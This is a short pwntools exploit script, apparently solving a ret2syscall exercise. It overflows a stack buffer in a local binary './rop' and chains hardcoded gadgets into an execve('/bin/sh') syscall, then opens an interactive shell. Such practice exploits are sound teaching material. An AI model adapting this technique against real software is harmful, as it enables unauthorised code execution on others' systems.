from pwn import *
## eax 0xb
## ebx addr('/bin/sh')
## ecx 0
## edx 0

pop_eax = 0x080bb196
pop_ecx_ebx = 0x0806eb91
pop_edx = 0x0806eb6a
int80 = 0x08049421

int_addr = 0x08049421
shell_addr = 0x080BE408

eax = 0xffffd27c
ebp = 0xffffd2e8

offset = int(ebp-eax+4)
payload = b'a'*offset + p32(pop_eax) + p32(0xb) + p32(pop_ecx_ebx) + p32(0x0) + p32(shell_addr) + p32(pop_edx) + p32(0x0) + p32(int80)

sh = process('./rop')
sh.sendline(payload)
sh.interactive()
